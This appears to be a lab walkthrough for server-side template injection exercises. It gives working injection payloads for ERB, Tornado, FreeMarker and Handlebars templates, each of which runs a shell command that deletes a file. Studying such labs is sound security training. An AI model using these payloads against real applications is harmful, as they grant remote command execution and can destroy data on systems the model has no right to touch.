### Basic server-side template injection

If you click on "View Details", you can see the following message: "Unfortunately this product is out of stock."

Check trying to change the message to `<%= 7*7 %>` and see it's resolving it and showing 49.
Based on the Ruby documentation, there is a "system" function.

`<%= system("rm /home/carlos/morale.txt") %>`

### Basic server-side template injection (code context)

Go to My Account, and select which way of displaying your username you want. 

After the user.nickname parameter, you can inject expressions, like this:
`blog-post-author-display=user.nickname}}{{7*7}}&csrf=y1jn5SrM0jrZbEQfwXJ7MVR1C0iXH3rO`

And when you comment on a post, it'll show the 49 after your username. 
So, let's inject some python: 

`blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')&csrf=y1jn5SrM0jrZbEQfwXJ7MVR1C0iXH3rO`

### Server-side template injection using documentation

Go to a product, edit template, and add this payload:
`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`

    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
